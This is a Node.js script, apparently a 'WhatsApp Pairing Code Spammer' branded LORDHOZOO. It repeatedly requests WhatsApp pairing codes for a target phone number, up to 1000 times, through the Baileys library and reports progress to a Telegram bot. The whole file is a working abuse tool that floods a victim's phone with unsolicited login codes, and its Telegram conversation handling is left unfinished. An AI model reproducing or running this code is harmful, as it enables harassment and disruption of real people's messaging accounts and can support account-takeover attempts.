const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const TelegramBot = require('node-telegram-bot-api');

// Color configurations
const colors = {
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    reset: '\x1b[0m'
};

const randomColor = () => {
    const colorKeys = Object.keys(colors).filter(key => key !== 'reset');
    return colors[colorKeys[Math.floor(Math.random() * colorKeys.length)]];
};

const currentColor = randomColor();

// Telegram Bot Setup
let telegramBot;
const telegramToken = process.env.TELEGRAM_TOKEN || '';
const chatId = process.env.CHAT_ID || '';

// Question interface
const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

// Initialize Telegram Bot
function initTelegramBot() {
    if (!telegramToken) {
        console.log(currentColor + 'Telegram bot token not provided. Some features will be disabled.' + colors.reset);
        return;
    }

    telegramBot = new TelegramBot(telegramToken, { polling: true });

    telegramBot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;

        if (text === '/start') {
            showMainMenu(chatId);
        } else if (text === '/spam') {
            telegramBot.sendMessage(chatId, 'Please enter the target number (62xxxxxxxx):');
            // You would need to implement conversation handling here
        }
    });

    console.log(currentColor + 'Telegram bot initialized successfully!' + colors.reset);
}

// Show main menu
function showMainMenu(chatId) {
    const options = {
        reply_markup: {
            keyboard: [
                ['Spam Pairing Code'],
                ['Check Status', 'Help']
            ],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    };

    telegramBot.sendMessage(chatId, 'Main Menu:', options);
}

// WhatsApp Bot Functionality
async function WhatsAppBot() {
    const { state } = await useMultiFileAuthState('./session');
    const whatsappBot = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    return whatsappBot;
}

// Main function
async function main() {
    console.log(currentColor + `Running... WhatsApp Pairing Code Spammer
=========================
 =SPAM PAIR WA LORDHOZOO=
=========================` + colors.reset);

    // Initialize Telegram bot
    initTelegramBot();

    // Check if running in Telegram mode or console mode
    if (!telegramToken) {
        // Console mode
        const phoneNumber = await question(currentColor + 'Target Number (62xxxxxxxx): ' + colors.reset);
        const spamCount = parseInt(await question(currentColor + 'Total spam (1-1000): ' + colors.reset));

        if (isNaN(spamCount) || spamCount <= 0 || spamCount > 1000) {
            console.log('Please enter a valid number between 1-1000.');
            return;
        }

        const whatsappBot = await WhatsAppBot();

        for (let i = 0; i < spamCount; i++) {
            try {
                let code = await whatsappBot.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(currentColor + `Success Spam Pairing Code - Number: ${phoneNumber} [${i + 1}/${spamCount}]` + colors.reset);
                
                // Send notification to Telegram if bot is active
                if (telegramBot && chatId) {
                    telegramBot.sendMessage(chatId, `Success Spam Pairing Code - Number: ${phoneNumber} [${i + 1}/${spamCount}]`);
                }
            } catch (error) {
                console.error('Error:', error.message);
                if (telegramBot && chatId) {
                    telegramBot.sendMessage(chatId, `Error: ${error.message}`);
                }
            }
        }
    }
}

// Start the application
main().catch(console.error);
